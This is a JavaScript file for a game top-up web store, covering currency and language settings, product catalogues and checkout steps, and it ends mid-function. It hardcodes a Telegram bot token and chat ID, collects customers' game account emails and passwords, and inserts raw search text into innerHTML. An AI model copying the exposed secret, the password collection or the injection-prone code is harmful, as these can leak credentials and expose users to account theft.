document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // INTRO ANIMATION TIMING ENGINE
    // ==========================================
    const introOverlayNode = document.getElementById("animation-container");
    if (introOverlayNode) {
        setTimeout(() => {
            introOverlayNode.style.opacity = "0";
            setTimeout(() => {
                introOverlayNode.remove();
                document.body.style.overflow = "auto";
                document.body.style.overflowX = "hidden";
                syncInitialNavbarLayout();
                routeTabView("#home");
            }, 800); 
        }, 3200); 
    }

    // ==========================================
    // TELEGRAM CONFIG
    // ==========================================
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
    const TELEGRAM_CHAT_ID = "8851363543"; 

    // ==========================================
    // CURRENCY SYSTEM
    // ==========================================
    // Exchange rates relative to EGP (1 EGP = X of currency)
    const CURRENCY_RATES = {
        EGP: { rate: 1,        symbol: "EGP",  name: "Egyptian Pound",  label: "Egyptian Pound (EGP)" },
        USD: { rate: 0.020,    symbol: "$",    name: "US Dollar",       label: "US Dollar ($)" },
        TND: { rate: 0.063,    symbol: "TND",  name: "Tunisian Dinar",  label: "Tunisian Dinar (TND)" },
        SAR: { rate: 0.075,    symbol: "SAR",  name: "Saudi Riyal",     label: "Saudi Riyal (SAR)" }
    };

    // Load saved currency from localStorage or default to EGP
    let activeCurrency = localStorage.getItem('shetos_currency') || 'EGP';

    function saveCurrency(code) {
        activeCurrency = code;
        localStorage.setItem('shetos_currency', code);
    }

    function convertPrice(egpPrice) {
        const rate = CURRENCY_RATES[activeCurrency].rate;
        const converted = egpPrice * rate;
        // Round to 2 decimal places; if whole number show no decimals
        return converted % 1 === 0 ? converted.toFixed(0) : converted.toFixed(2);
    }

    function formatPrice(egpPrice) {
        const sym = CURRENCY_RATES[activeCurrency].symbol;
        const val = convertPrice(egpPrice);
        if (activeCurrency === 'EGP') return `${val} EGP`;
        if (activeCurrency === 'USD') return `$${val}`;
        return `${val} ${sym}`;
    }

    function updateCurrencyLabel() {
        const labelEl = document.getElementById('current-currency-label');
        if (labelEl) labelEl.textContent = `Current: ${CURRENCY_RATES[activeCurrency].label}`;
    }

    // Updates all .item-price spans inside the product list using their parent's data-price
    function refreshProductListPrices() {
        if (!rechargeList) return;
        rechargeList.querySelectorAll('.recharge-item[data-price]').forEach(item => {
            const egpPrice = parseFloat(item.getAttribute('data-price'));
            const priceEl = item.querySelector('.item-price');
            if (priceEl) priceEl.textContent = formatPrice(egpPrice);
        });
    }

    // ==========================================
    // CURRENCY MODAL LOGIC
    // ==========================================
    const currencyModal       = document.getElementById('currency-modal');
    const openCurrencyBtn     = document.getElementById('open-currency-modal-btn');
    const closeCurrencyModal  = document.getElementById('close-currency-modal');
    const currencyChoiceBtns  = document.querySelectorAll('.currency-choice-btn');

    function markActiveCurrencyBtn() {
        currencyChoiceBtns.forEach(btn => {
            if (btn.getAttribute('data-currency') === activeCurrency) {
                btn.classList.add('currency-active');
            } else {
                btn.classList.remove('currency-active');
            }
        });
    }

    if (openCurrencyBtn) {
        openCurrencyBtn.addEventListener('click', () => {
            markActiveCurrencyBtn();
            if (currencyModal) currencyModal.classList.add('active');
        });
    }

    if (closeCurrencyModal) {
        closeCurrencyModal.addEventListener('click', () => {
            if (currencyModal) currencyModal.classList.remove('active');
        });
    }

    currencyChoiceBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const chosen = btn.getAttribute('data-currency');
            saveCurrency(chosen);
            markActiveCurrencyBtn();
            updateCurrencyLabel();
            // If product list is open, refresh its prices
            refreshProductListPrices();
            // Close after short delay so user sees the checkmark
            setTimeout(() => {
                if (currencyModal) currencyModal.classList.remove('active');
            }, 380);
        });
    });

    // Init label on load
    updateCurrencyLabel();

    // ==========================================
    // LANGUAGE SYSTEM (NEW)
    // ==========================================
    const TRANSLATIONS = {
        default: {
            navHome: "Home",
            navSearch: "search",
            navAbout: "About",
            navSetting: "setting",
            chooseGame: "CHOOSE YOUR GAME",
            searchPlaceholder: "Search a game...",
            settingsTitle: "Settings",
            changeCurrency: "CHANGE CURRENCY",
            changeLanguage: "CHANGE LANGUAGE",
            currentLang: "Current: Default",
            chooseLanguage: "Choose Your Language",
            whyChoose: "Why Choose Shetos Store?",
            allGames: "All Your Games in One Place:",
            allGamesText: "From mobile battle royales to major console and PC titles, we provide fast and reliable charging services for all your favorite games.",
            playerFirst: "Player-First Behavior:",
            playerFirstText: "We don't just process transactions; we build a community. Our team is dedicated to treating every gamer with the respect, honesty, and friendly support you deserve.",
            topDeals: "Top-Tier Deals:",
            topDealsText: "Through smart marketing and exciting promotions, we make sure you get the best value for your money. Keep an eye out for our exclusive offers and community rewards!",
            ourMission: "Our Mission",
            missionText: "To keep you in the game without the hassle. At Shetos Store, we combine seamless service, unbeatable deals, and a genuine passion for gaming to give you the best experience possible.",
            selectProducts: "SELECT PRODUCTS",
            basket: "Basket",
            basketMarket: "SHOPPING BASKET MARKET",
            totalAmount: "TOTAL AMOUNT:",
            confirmCheckout: "CONFIRM & COMPLETE CHECKOUT",
            enterGameId: "ENTER YOUR GAME ID",
            enterIdPlaceholder: "اكتب الاي دي - enter your id",
            confirmOrder: "CONFIRM ORDER",
            enterCredentials: "ENTER ACCOUNT CREDENTIALS",
            emailPlaceholder: "Gmail / Email",
            passPlaceholder: "Password",
            chooseMethod: "Choose your recharge method",
            idRecharge: "ID RECHARGE",
            idDesc: "شحن من خلال اي دي",
            loginAccount: "LOGIN ACCOUNT",
            loginDesc: "شحن من خلال الحساب",
            basketEmpty: "Your basket is empty! Add products first.",
            successMsg: "تم استلام رسالتك , و سيتم الشحن تلقاءيا خلال 20 دقيقه بعد استلام المبلغ المختار 01096170744",
        },
        en: {
            navHome: "Home",
            navSearch: "Search",
            navAbout: "About",
            navSetting: "Settings",
            chooseGame: "CHOOSE YOUR GAME",
            searchPlaceholder: "Search a game...",
            settingsTitle: "Settings",
            changeCurrency: "CHANGE CURRENCY",
            changeLanguage: "CHANGE LANGUAGE",
            currentLang: "Current: English",
            chooseLanguage: "Choose Your Language",
            whyChoose: "Why Choose Shetos Store?",
            allGames: "All Your Games in One Place:",
            allGamesText: "From mobile battle royales to major console and PC titles, we provide fast and reliable charging services for all your favorite games.",
            playerFirst: "Player-First Behavior:",
            playerFirstText: "We don't just process transactions; we build a community. Our team is dedicated to treating every gamer with the respect, honesty, and friendly support you deserve.",
            topDeals: "Top-Tier Deals:",
            topDealsText: "Through smart marketing and exciting promotions, we make sure you get the best value for your money. Keep an eye out for our exclusive offers and community rewards!",
            ourMission: "Our Mission",
            missionText: "To keep you in the game without the hassle. At Shetos Store, we combine seamless service, unbeatable deals, and a genuine passion for gaming to give you the best experience possible.",
            selectProducts: "SELECT PRODUCTS",
            basket: "Basket",
            basketMarket: "SHOPPING BASKET",
            totalAmount: "TOTAL AMOUNT:",
            confirmCheckout: "CONFIRM & COMPLETE CHECKOUT",
            enterGameId: "ENTER YOUR GAME ID",
            enterIdPlaceholder: "Enter your Game ID",
            confirmOrder: "CONFIRM ORDER",
            enterCredentials: "ENTER ACCOUNT CREDENTIALS",
            emailPlaceholder: "Gmail / Email",
            passPlaceholder: "Password",
            chooseMethod: "Choose your recharge method",
            idRecharge: "ID RECHARGE",
            idDesc: "Recharge via ID",
            loginAccount: "LOGIN ACCOUNT",
            loginDesc: "Recharge via account login",
            basketEmpty: "Your basket is empty! Please add products first.",
            successMsg: "Your order has been received. Recharge will be processed within 20 minutes after payment. Contact: 01096170744",
        },
        ar: {
            navHome: "الرئيسية",
            navSearch: "بحث",
            navAbout: "عن المتجر",
            navSetting: "الإعدادات",
            chooseGame: "اختر لعبتك",
            searchPlaceholder: "ابحث عن لعبة...",
            settingsTitle: "الإعدادات",
            changeCurrency: "تغيير العملة",
            changeLanguage: "تغيير اللغة",
            currentLang: "الحالية: العربية",
            chooseLanguage: "اختر لغتك",
            whyChoose: "لماذا تختار شيتوس ستور؟",
            allGames: "جميع ألعابك في مكان واحد:",
            allGamesText: "من ألعاب البقاء على المحمول إلى الألعاب الكبرى، نوفر خدمات شحن سريعة وموثوقة لجميع ألعابك المفضلة.",
            playerFirst: "اللاعب أولاً:",
            playerFirstText: "لا نعالج المعاملات فحسب، بل نبني مجتمعاً. فريقنا ملتزم بمعاملة كل لاعب باحترام وأمانة ودعم ودي.",
            topDeals: "أفضل العروض:",
            topDealsText: "من خلال التسويق الذكي والعروض المثيرة، نضمن لك أفضل قيمة لأموالك. تابع عروضنا الحصرية!",
            ourMission: "مهمتنا",
            missionText: "إبقائك في اللعبة بدون متاعب. في شيتوس ستور، نجمع الخدمة السلسة وأفضل الصفقات والشغف الحقيقي بالألعاب لمنحك أفضل تجربة.",
            selectProducts: "اختر المنتجات",
            basket: "السلة",
            basketMarket: "سلة التسوق",
            totalAmount: "الإجمالي:",
            confirmCheckout: "تأكيد وإتمام الطلب",
            enterGameId: "أدخل معرف اللعبة",
            enterIdPlaceholder: "اكتب الاي دي - enter your id",
            confirmOrder: "تأكيد الطلب",
            enterCredentials: "أدخل بيانات الحساب",
            emailPlaceholder: "Gmail / البريد الإلكتروني",
            passPlaceholder: "كلمة المرور",
            chooseMethod: "اختر طريقة الشحن",
            idRecharge: "شحن بالاي دي",
            idDesc: "شحن من خلال اي دي",
            loginAccount: "تسجيل الدخول",
            loginDesc: "شحن من خلال الحساب",
            basketEmpty: "سلتك فارغة! أضف منتجات أولاً.",
            successMsg: "تم استلام رسالتك , و سيتم الشحن تلقاءيا خلال 20 دقيقه بعد استلام المبلغ المختار 01096170744",
        }
    };

    // Load saved language from localStorage or default
    let activeLang = localStorage.getItem('shetos_language') || 'default';

    function t(key) {
        return (TRANSLATIONS[activeLang] && TRANSLATIONS[activeLang][key]) 
            ? TRANSLATIONS[activeLang][key] 
            : TRANSLATIONS['default'][key] || key;
    }

    function applyLanguage() {
        const lang = activeLang;
        // Set direction
        document.body.classList.remove('lang-ar', 'lang-en', 'lang-default');
        document.body.classList.add('lang-' + lang);

        // Translate all data-i18n elements
        document.querySelectorAll('[data-i18n]').forEach(el => {
            const key = el.getAttribute('data-i18n');
            if (TRANSLATIONS[lang] && TRANSLATIONS[lang][key]) {
                el.textContent = TRANSLATIONS[lang][key];
            } else {
                el.textContent = TRANSLATIONS['default'][key] || el.textContent;
            }
        });

        // Translate placeholders
        document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
            const key = el.getAttribute('data-i18n-placeholder');
            el.placeholder = t(key);
        });

        // Update current language label
        const langLabel = document.getElementById('current-language-label');
        if (langLabel) langLabel.textContent = t('currentLang');

        // Update dynamic UI text
        const rechargeTitle = document.querySelector('.recharge-title');
        if (rechargeTitle) rechargeTitle.textContent = t('selectProducts');

        const basketMarketEl = document.querySelector('.summary-header p');
        if (basketMarketEl) basketMarketEl.textContent = t('basketMarket');

        const totalLabel = document.querySelector('.basket-total-row span:first-child');
        if (totalLabel) totalLabel.textContent = t('totalAmount');

        const checkoutBtn2 = document.getElementById('checkout-btn');
        if (checkoutBtn2 && !checkoutBtn2.disabled) checkoutBtn2.textContent = t('confirmCheckout');

        const idHeader = document.querySelector('#id-input-section-box .input-header p');
        if (idHeader) idHeader.textContent = t('enterGameId');

        const idFieldEl = document.getElementById('game-id-field');
        if (idFieldEl) idFieldEl.placeholder = t('enterIdPlaceholder');

        const confirmIdEl = document.getElementById('confirm-id-btn');
        if (confirmIdEl && !confirmIdEl.disabled) confirmIdEl.textContent = t('confirmOrder');

        const accHeader = document.querySelector('#acc-input-section-box .input-header p');
        if (accHeader) accHeader.textContent = t('enterCredentials');

        const emailEl = document.getElementById('acc-email-field');
        if (emailEl) emailEl.placeholder = t('emailPlaceholder');

        const passEl = document.getElementById('acc-pass-field');
        if (passEl) passEl.placeholder = t('passPlaceholder');

        const ffSubtitle = document.querySelector('.ff-type-subtitle');
        if (ffSubtitle) ffSubtitle.textContent = t('chooseMethod');

        const ffIdLabel = document.querySelector('#ff-choose-id .ff-type-label');
        if (ffIdLabel) ffIdLabel.textContent = t('idRecharge');
        const ffIdDesc = document.querySelector('#ff-choose-id .ff-type-desc');
        if (ffIdDesc) ffIdDesc.textContent = t('idDesc');

        const ffAccLabel = document.querySelector('#ff-choose-acc .ff-type-label');
        if (ffAccLabel) ffAccLabel.textContent = t('loginAccount');
        const ffAccDesc = document.querySelector('#ff-choose-acc .ff-type-desc');
        if (ffAccDesc) ffAccDesc.textContent = t('loginDesc');

        const openBasketBtn = document.getElementById('open-basket-from-products');
        if (openBasketBtn) {
            const count = openBasketBtn.querySelector('span') ? openBasketBtn.querySelector('span').textContent : '0';
            openBasketBtn.innerHTML = `${t('basket')} (<span>${count}</span>) 🛒`;
        }

        // Update search placeholder live
        const searchInp = document.getElementById('store-search-input');
        if (searchInp) searchInp.placeholder = t('searchPlaceholder');
    }

    function saveLanguage(code) {
        activeLang = code;
        localStorage.setItem('shetos_language', code);
        applyLanguage();
    }

    function updateLanguageLabel() {
        const labelEl = document.getElementById('current-language-label');
        if (labelEl) labelEl.textContent = t('currentLang');
    }

    // ==========================================
    // LANGUAGE MODAL LOGIC (NEW)
    // ==========================================
    const languageModal       = document.getElementById('language-modal');
    const openLanguageBtn     = document.getElementById('open-language-modal-btn');
    const closeLanguageModal  = document.getElementById('close-language-modal');
    const languageChoiceBtns  = document.querySelectorAll('.language-choice-btn');

    function markActiveLangBtn() {
        languageChoiceBtns.forEach(btn => {
            if (btn.getAttribute('data-lang') === activeLang) {
                btn.classList.add('lang-active');
            } else {
                btn.classList.remove('lang-active');
            }
        });
    }

    if (openLanguageBtn) {
        openLanguageBtn.addEventListener('click', () => {
            markActiveLangBtn();
            if (languageModal) languageModal.classList.add('active');
        });
    }

    if (closeLanguageModal) {
        closeLanguageModal.addEventListener('click', () => {
            if (languageModal) languageModal.classList.remove('active');
        });
    }

    languageChoiceBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const chosen = btn.getAttribute('data-lang');
            saveLanguage(chosen);
            markActiveLangBtn();
            setTimeout(() => {
                if (languageModal) languageModal.classList.remove('active');
            }, 380);
        });
    });

    // Apply language on load
    applyLanguage();

    // ==========================================
    // DOM REFERENCES
    // ==========================================
    const storePage = document.getElementById('store-page');

    // Modals
    const ffTypeModal      = document.getElementById('ff-type-modal');
    const rechargeModal    = document.getElementById('recharge-modal');
    const credentialsModal = document.getElementById('credentials-modal');
    const checkoutModal    = document.getElementById('checkout-modal');

    // FF Type selection buttons
    const ffChooseId  = document.getElementById('ff-choose-id');
    const ffChooseAcc = document.getElementById('ff-choose-acc');
    const closeFFType = document.getElementById('close-ff-type');

    // Recharge / product list
    const rechargeList = document.querySelector('.recharge-list');
    const backToId     = document.getElementById('back-to-id');
    const openBasketFromProducts = document.getElementById('open-basket-from-products');

    // Credentials modal elements
    const credModalTitle   = document.getElementById('cred-modal-title');
    const credModalIcon    = document.getElementById('cred-modal-icon');
    const idCredSection    = document.getElementById('id-credentials-section');
    const accCredSection   = document.getElementById('acc-credentials-section');
    const idInputSectionBox  = document.getElementById('id-input-section-box');
    const accInputSectionBox = document.getElementById('acc-input-section-box');
    const idField          = document.getElementById('game-id-field');
    const emailField       = document.getElementById('acc-email-field');
    const passField        = document.getElementById('acc-pass-field');
    const confirmIdBtn     = document.getElementById('confirm-id-btn');
    const confirmAccBtn    = document.getElementById('confirm-acc-btn');
    const backFromCreds    = document.getElementById('back-from-credentials');

    // Checkout
    const backToRecharge       = document.getElementById('back-to-recharge');
    const checkoutActionCont   = document.getElementById('checkout-action-container');
    const successNotification  = document.getElementById('success-notification');
    const floatingBasketTrigger = document.getElementById('floating-basket-trigger');

    // ==========================================
    // STATE
    // ==========================================
    let currentGame   = "";
    let currentMethod = "ID"; // "ID" or "ACC"
    let shoppingBasket = [];
    let authenticatedUserMeta = { method: "", rawId: "", email: "", password: "" };

    // ==========================================
    // THEMES
    // ==========================================
    const themes = {
        "FREE FIRE":   { color: "#ff6600", accent: "#ff8a00", icon: "https://static.wikia.nocookie.net/garena-freefire/images/f/f2/Free_Fire_App_Icon.png/revision/latest/smart/width/250/height/250?cb=20240517153409" },
        "PUBG":        { color: "#00a2ff", accent: "#007acc", icon: "https://www.pubgmobile.com/common/images/icon_logo.jpg" },
        "CALL OF DUTY":{ color: "#e5c158", accent: "#c29d38", icon: "https://static.wikia.nocookie.net/callofduty/images/3/31/CODMobile_App_Icon_Global_2024_Season10_CODM.png/revision/latest/scale-to-width-down/250?cb=20241105161610" },
        "FIFA MOBILE": { color: "#00ffcc", accent: "#00ccaa", icon: "https://cdn-www.bluestacks.com/bs-images/70042468c0d43639228178f9e61aec7f.png" },
        "PES MOBILE":  { color: "#00cc44", accent: "#009933", icon: "https://cdn-offer-photos.zeusx.com/b12a0ebf-889c-4053-9c53-3f756e8602d1.png" },
        "BLOOD STRIKE":{ color: "#ff3333", accent: "#cc0000", icon: "https://www.blood-strike.com/m/gw/20230721092756/data/share.jpg" }
    };

    // ==========================================
    // PRODUCTS DATA
    // All data-price values are in EGP (base currency)
    // ==========================================
    const ffIdProducts = `
        <div class="recharge-item" data-id="ff_id_100" data-name="◇ 100 Diamond" data-price="55"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_210" data-name="◇ 210 Diamond" data-price="105"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_310" data-name="◇ 310 Diamond" data-price="155"><span class="item-name">◇ 310 Diamond</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_420" data-name="◇ 420 Diamond" data-price="205"><span class="item-name">◇ 420 Diamond</span><span class="item-price">205 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_520" data-name="◇ 520 Diamond" data-price="255"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_id_w_mem" data-name="★ Weekly Membership" data-price="110"><span class="item-name">★ Weekly Membership</span><span class="item-price">110 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_id_m_mem" data-name="★ Monthly Membership" data-price="540"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>
        <hr class="about-divider">
        <h3 class="selection-title" style="font-size:1rem; margin:10px 0 5px;">another sales 🔔</h3>
        <div class="recharge-item" data-id="ff_id_750" data-name="◇ 750 Diamond [اسبوعي +300]" data-price="265"><span class="item-name">◇ 750 Diamond [اسبوعي +300]</span><span class="item-price">265 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_1050" data-name="◇ 1050 Diamond [اسبوعي +600]" data-price="420"><span class="item-name">◇ 1050 Diamond [اسبوعي +600]</span><span class="item-price">420 EGP</span></div>
        <div class="recharge-item" data-id="ff_id_1450" data-name="◇ 1450 Diamond [اسبوعي +1000]" data-price="660"><span class="item-name">◇ 1450 Diamond [اسبوعي +1000]</span><span class="item-price">660 EGP</span></div>
    `;

    const ffAccProducts = `
        <div class="recharge-item membership" data-id="ff_acc_w_mem" data-name="★ Weekly Membership" data-price="85"><span class="item-name">★ Weekly Membership</span><span class="item-price">85 EGP</span></div>
        <div class="recharge-item membership" data-id="ff_acc_m_mem" data-name="★ Monthly Membership" data-price="430"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
    `;

    const pubgProducts = `
        <div class="recharge-item" data-id="pubg_30" data-name="◇ 30 UC" data-price="25"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item" data-id="pubg_60" data-name="◇ 60 UC" data-price="45"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
        <div class="recharge-item" data-id="pubg_325" data-name="◇ 325 UC" data-price="215"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
        <div class="recharge-item" data-id="pubg_660" data-name="◇ 660 UC" data-price="425"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
        <div class="recharge-item" data-id="pubg_1800" data-name="◇ 1800 UC" data-price="1055"><span class="item-name">◇ 1800 UC</span><span class="item-price">1055 EGP</span></div>
        <div class="recharge-item membership" data-id="pubg_lvl_50" data-name="★ LVL (1 - 50)" data-price="255"><span class="item-name">★ LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership" data-id="pubg_lvl_100" data-name="★ LVL (1 - 100)" data-price="510"><span class="item-name">★ LVL (1 - 100)</span><span class="item-price">510 EGP</span></div>
    `;

    const codProducts = `
        <div class="recharge-item" data-id="cod_30" data-name="◇ 30 CP" data-price="20"><span class="item-name">◇ 30 CP</span><span class="item-price">20 EGP</span></div>
        <div class="recharge-item" data-id="cod_80" data-name="◇ 80 CP" data-price="50"><span class="item-name">◇ 80 CP</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item" data-id="cod_420" data-name="◇ 420 CP" data-price="230"><span class="item-name">◇ 420 CP</span><span class="item-price">230 EGP</span></div>
        <div class="recharge-item" data-id="cod_880" data-name="◇ 880 CP" data-price="455"><span class="item-name">◇ 880 CP</span><span class="item-price">455 EGP</span></div>
        <div class="recharge-item" data-id="cod_2400" data-name="◇ 2400 CP" data-price="1130"><span class="item-name">◇ 2400 CP</span><span class="item-price">1130 EGP</span></div>
        <div class="recharge-item membership" data-id="cod_bp" data-name="★ Battle Pass Premium" data-price="130"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
    `;

    const fifaProducts = `
        <div class="recharge-item" data-id="fifa_40" data-name="◇ 40 FC Points" data-price="25"><span class="item-name">◇ 40 FC Points</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item" data-id="fifa_100" data-name="◇ 100 FC Points" data-price="55"><span class="item-name">◇ 100 FC Points</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="fifa_520" data-name="◇ 520 FC Points" data-price="255"><span class="item-name">◇ 520 FC Points</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item" data-id="fifa_1070" data-name="◇ 1070 FC Points" data-price="505"><span class="item-name">◇ 1070 FC Points</span><span class="item-price">505 EGP</span></div>
    `;

    const pesProducts = `
        <div class="recharge-item" data-id="pes_137" data-name="◇ 137 Coins" data-price="70"><span class="item-name">◇ 137 Coins</span><span class="item-price">70 EGP</span></div>
        <div class="recharge-item" data-id="pes_315" data-name="◇ 315 Coins" data-price="155"><span class="item-name">◇ 315 Coins</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item" data-id="pes_578" data-name="◇ 578 Coins" data-price="265"><span class="item-name">◇ 578 Coins</span><span class="item-price">265 EGP</span></div>
        <div class="recharge-item" data-id="pes_788" data-name="◇ 788 Coins" data-price="355"><span class="item-name">◇ 788 Coins</span><span class="item-price">355 EGP</span></div>
        <div class="recharge-item" data-id="pes_1092" data-name="◇ 1092 Coins" data-price="485"><span class="item-name">◇ 1092 Coins</span><span class="item-price">485 EGP</span></div>
        <div class="recharge-item membership" data-id="pes_hero" data-name="★ heroic Pass" data-price="260"><span class="item-name">★ heroic Pass</span><span class="item-price">260 EGP</span></div>
    `;

    const bsProducts = `
        <div class="recharge-item" data-id="bs_51" data-name="◇ 51 Gold" data-price="30"><span class="item-name">◇ 51 Gold</span><span class="item-price">30 EGP</span></div>
        <div class="recharge-item" data-id="bs_105" data-name="◇ 105 Gold" data-price="55"><span class="item-name">◇ 105 Gold</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item" data-id="bs_320" data-name="◇ 320 Gold" data-price="150"><span class="item-name">◇ 320 Gold</span><span class="item-price">150 EGP</span></div>
        <div class="recharge-item" data-id="bs_540" data-name="◇ 540 Gold" data-price="250"><span class="item-name">◇ 540 Gold</span><span class="item-price">250 EGP</span></div>
        <div class="recharge-item" data-id="bs_1100" data-name="◇ 1100 Gold" data-price="495"><span class="item-name">◇ 1100 Gold</span><span class="item-price">495 EGP</span></div>
    `;

    // ==========================================
    // NAV / ROUTING
    // ==========================================
    function inverseMousePosition(element, event) {
        const rect = element.getBoundingClientRect();
        const x = event.clientX - rect.left;
        const y = event.clientY - rect.top;
        return {
            x1: -(x - rect.width / 2) / 20,
            y1: -(y - rect.height / 2) / 20
        };
    }

    function handleTabClick(event) {
        const navNode = document.querySelector('.nav');
        const targetLi = event.target.closest('li');
        if (!targetLi) return;
        const width = targetLi.offsetWidth;
        const left = targetLi.getBoundingClientRect().left;
        const offsetLeft = left - navNode.getBoundingClientRect().left;
        document.querySelectorAll('.nav ul li').forEach(link => link.classList.remove('active'));
        targetLi.classList.add('active');
        navNode.style.setProperty('--after-bg-position', offsetLeft);
        navNode.style.setProperty('--after-radial-bg-position', (left + width / 2) - navNode.getBoundingClientRect().left);
        navNode.style.setProperty('--after-bg-width', width);
        const targetHash = event.target.getAttribute('href');
        routeTabView(targetHash);
    }

    const premiumNav = document.querySelector('.nav');
    if (premiumNav) {
        const navLinks = premiumNav.querySelectorAll('li a');
        for (let i = 0; i < navLinks.length; i++) {
            navLinks[i].addEventListener('click', (e) => { e.preventDefault(); handleTabClick(e); });
            navLinks[i].addEventListener("mousemove", (event) => {
                const tilt = inverseMousePosition(event.target, event);
                premiumNav.style.setProperty("--tilt-bg-y", tilt.x1 * 2);
                premiumNav.style.setProperty("--tilt-bg-x", tilt.y1 * 2);
            });
        }
    }

    function syncInitialNavbarLayout() {
        if (!storePage || !storePage.classList.contains('active')) return;
        if (!premiumNav) return;
        const activeLi = premiumNav.querySelector('ul li.active') || premiumNav.querySelector('ul li');
        if (!activeLi) return;
        const width = activeLi.offsetWidth;
        const left = activeLi.getBoundingClientRect().left;
        const offsetLeft = left - premiumNav.getBoundingClientRect().left;
        premiumNav.style.setProperty('--after-bg-position', offsetLeft);
        premiumNav.style.setProperty('--after-radial-bg-position', (left + width / 2) - premiumNav.getBoundingClientRect().left);
        premiumNav.style.setProperty('--after-bg-width', width);
    }
    window.addEventListener('resize', syncInitialNavbarLayout);

    function routeTabView(hashTarget) {
        document.querySelectorAll('.tab-content-view').forEach(view => view.classList.remove('active-view'));
        if (hashTarget === "#home" || hashTarget === "") {
            const homeSec = document.getElementById('home-content-section');
            if (homeSec) homeSec.classList.add('active-view');
        } else if (hashTarget === "#search") {
            const searchSec = document.getElementById('search-content-section');
            if (searchSec) searchSec.classList.add('active-view');
            const searchInp = document.getElementById('store-search-input');
            if (searchInp) searchInp.value = "";
            processLiveSearchFilter("");
        } else if (hashTarget === "#about") {
            const aboutSec = document.getElementById('about-content-section');
            if (aboutSec) aboutSec.classList.add('active-view');
        } else if (hashTarget === "#setting") {
            const settingSec = document.getElementById('setting-content-section');
            if (settingSec) settingSec.classList.add('active-view');
        }
    }

    // ==========================================
    // SEARCH
    // ==========================================
    const searchInput = document.getElementById('store-search-input');
    const searchResultsViewport = document.getElementById('search-results-viewport');

    if (searchInput) {
        searchInput.addEventListener('input', (e) => { processLiveSearchFilter(e.target.value); });
    }

    function processLiveSearchFilter(queryText) {
        if (!searchResultsViewport) return;
        const cleanedQuery = queryText.trim().toLowerCase();
        searchResultsViewport.innerHTML = "";
        if (cleanedQuery === "") {
            searchResultsViewport.innerHTML = `<div style="color: #52525b; font-size: 1rem; grid-column: 1/-1; text-align:center;">Type a game title to filter...</div>`;
            return;
        }
        const sourceCards = document.querySelectorAll('#home-content-section .game-card');
        let matchesCount = 0;
        sourceCards.forEach(card => {
            const indexName = card.getAttribute('data-game-search-title') || "";
            if (indexName.includes(cleanedQuery)) {
                matchesCount++;
                const clonedCard = card.cloneNode(true);
                clonedCard.addEventListener('click', () => {
                    if (indexName.includes("free fire"))   { currentGame = "FREE FIRE";    openFFTypeModal(); }
                    else if (indexName.includes("pubg"))   { currentGame = "PUBG";          openProductsDirectly(); }
                    else if (indexName.includes("call of duty")) { currentGame = "CALL OF DUTY"; openProductsDirectly(); }
                    else if (indexName.includes("fifa"))   { currentGame = "FIFA MOBILE";  openProductsDirectly(); }
                    else if (indexName.includes("pes"))    { currentGame = "PES MOBILE";   openProductsDirectly(); }
                    else if (indexName.includes("blood strike")) { currentGame = "BLOOD STRIKE"; openProductsDirectly(); }
                });
                searchResultsViewport.appendChild(clonedCard);
            }
        });
        if (matchesCount === 0) {
            searchResultsViewport.innerHTML = `<div class="not-found-feedback">No Games Found for "${queryText}"</div>`;
        }
    }

    // ==========================================
    // FLOW: FREE FIRE (3 steps)
    // ==========================================
    function openFFTypeModal() {
        if (ffTypeModal) ffTypeModal.classList.add('active');
    }

    if (closeFFType) {
        closeFFType.addEventListener('click', () => {
            if (ffTypeModal) ffTypeModal.classList.remove('active');
            resetBasket();
        });
    }

    if (ffChooseId) {
        ffChooseId.addEventListener('click', () => {
            currentMethod = "ID";
            if (ffTypeModal) ffTypeModal.classList.remove('active');
            openProductsForFF("ID");
        });
    }

    if (ffChooseAcc) {
        ffChooseAcc.addEventListener('click', () => {
            currentMethod = "ACC";
            if (ffTypeModal) ffTypeModal.classList.remove('active');
            openProductsForFF("ACC");
        });
    }

    function openProductsForFF(method) {
        if (!rechargeList) return;
        if (method === "ID") {
            rechargeList.innerHTML = ffIdProducts;
        } else {
            rechargeList.innerHTML = ffAccProducts;
        }
        applyThemeColors();
        refreshProductListPrices(); // apply active currency
        if (rechargeModal) rechargeModal.classList.add('active');
        injectReactiveQuantitySelectors();
    }

    // ==========================================
    // FLOW: OTHER GAMES (2 steps)
    // ==========================================
    function openProductsDirectly() {
        currentMethod = "ID";
        if (!rechargeList) return;
        if (currentGame === "PUBG")         rechargeList.innerHTML = pubgProducts;
        else if (currentGame === "CALL OF DUTY") rechargeList.innerHTML = codProducts;
        else if (currentGame === "FIFA MOBILE")  rechargeList.innerHTML = fifaProducts;
        else if (currentGame === "PES MOBILE")   rechargeList.innerHTML = pesProducts;
